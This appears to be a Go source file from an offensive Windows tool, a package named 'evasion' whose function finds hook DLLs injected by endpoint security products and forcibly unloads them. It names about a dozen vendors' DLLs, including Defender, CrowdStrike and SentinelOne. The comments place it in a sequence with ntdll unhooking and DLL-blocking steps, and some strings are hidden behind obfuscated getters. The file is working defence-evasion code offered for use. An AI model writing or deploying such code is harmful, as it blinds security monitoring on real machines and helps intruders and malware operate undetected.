//go:build windows
// +build windows

package evasion

// unloadEDRDLLs removes monitoring DLLs injected by endpoint security products
// before our protection layers were active.
//
// EDR products inject hook DLLs into every new process at creation time, before
// user-mode code runs.  blockNonMicrosoftDLLs() seals the door on future
// injections but does nothing about DLLs already resident in memory.  This
// function walks PEB.Ldr.InLoadOrderModuleList, identifies any loaded DLL whose
// base name is on the EDR blacklist, and forcefully unloads it via
// LdrUnloadDll (resolved from already-clean ntdll).
//
// LdrUnloadDll is preferred over FreeLibrary because:
//   - It is a direct ntdll export, already restored by unhookNtdll().
//   - It bypasses any kernel32 hooks still present at call time.
//
// Must be called after unhookNtdll() (clean ntdll required) and before
// blockDynamicCode() (ACG must not yet be active).

import (
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// edrHookDLLs is the set of lowercase base names of monitoring/hook DLLs
// injected by common endpoint security products.
var edrHookDLLs = map[string]bool{
	// Malwarebytes
	"mbamext.dll": true,
	"mwac.dll":    true,
	// DrWeb
	"kscntum.dll": true,
	// Kaspersky
	"kloehk.dll": true,
	"klhk.dll":   true,
	// Windows Defender
	"mpoav.dll": true,
	// SentinelOne
	"sentinelmonitor.dll": true,
	// CrowdStrike Falcon
	"cshook64.dll": true,
	// Cylance / BlackBerry
	"cyoptics.dll": true,
	// Carbon Black / VMware
	"cbhook.dll": true,
	// Avast / AVG
	"aswhook.dll": true,
	// Trend Micro
	"tmmon64.dll": true,
	// Sophos
	"sophosavdetection64.dll": true,
	// Bitdefender
	"atcuf64.dll": true,
}

func unloadEDRDLLs() {
	peb := getPEB()
	if peb == 0 {
		return
	}
	ldr := *(*uintptr)(unsafe.Pointer(peb + 0x18))
	if ldr == 0 {
		return
	}

	head := ldr + 0x10
	flink := *(*uintptr)(unsafe.Pointer(head))

	// Collect DllBase addresses first — LdrUnloadDll mutates the LDR list,
	// so we must not call it while still walking the list.
	var toUnload []uintptr
	seen := make(map[uintptr]bool)
	for flink != head && flink != 0 && !seen[flink] {
		seen[flink] = true

		nameLen := *(*uint16)(unsafe.Pointer(flink + 0x48))
		nameBuf := *(*uintptr)(unsafe.Pointer(flink + 0x50))
		dllBase := *(*uintptr)(unsafe.Pointer(flink + 0x30))

		if nameLen > 0 && nameBuf != 0 && dllBase != 0 {
			charCount := int(nameLen / 2)
			if charCount > 520 {
				charCount = 520
			}
			nameSlice := (*[520]uint16)(unsafe.Pointer(nameBuf))[:charCount:charCount]
			baseName := strings.ToLower(filepath.Base(windows.UTF16ToString(nameSlice)))
			if edrHookDLLs[baseName] {
				toUnload = append(toUnload, dllBase)
			}
		}

		flink = *(*uintptr)(unsafe.Pointer(flink))
	}

	if len(toUnload) == 0 {
		return
	}

	ldrUnload := windows.NewLazySystemDLL(sNtdll()).NewProc(sLdrUnloadDll())
	if ldrUnload.Find() != nil {
		return
	}
	for _, base := range toUnload {
		ldrUnload.Call(base)
	}
}
